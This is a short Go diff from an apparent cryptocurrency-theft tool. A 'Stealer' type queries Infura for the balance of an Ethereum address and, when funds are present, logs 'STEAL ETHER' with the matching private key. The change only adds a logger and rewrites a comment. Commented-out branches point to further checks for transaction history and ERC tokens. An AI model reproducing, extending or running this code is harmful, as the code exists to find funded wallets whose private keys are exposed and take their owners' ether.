@@ -11,17 +11,18 @@ import (
 
 type Stealer struct {
 	infuraClient *infura.Infura
+	logger       *log.Logger
 }
 
 func New() *Stealer {
-	return &Stealer{infuraClient: infura.New()}
+	return &Stealer{infuraClient: infura.New(), logger: log.New()}
 }
 
-// Steal ether online through infura
+// Steal steals Ethereum through Infura.
 func (s *Stealer) Steal(addr common.Address, privkey []byte) {
 	addrStr := addr.String()
 	if canStealEther, _ := s.infuraClient.HasBalance(addrStr); canStealEther {
-		log.Infof("STEAL ETHER from %s !!SECRET!! %x", addrStr, privkey)
+		s.logger.Infof("STEAL ETHER from %s !!SECRET!! %x", addrStr, privkey)
 		// } else if canCandidate, _ := hasTxCount(addrStr); canCandidate {
 		// 	log.Infof("GOT CANDIDATE %s !!SECRET!! %x", addrStr, privkey)
 		// } else if canStealERC := contract.CanSteal(addr); canStealERC != "" {
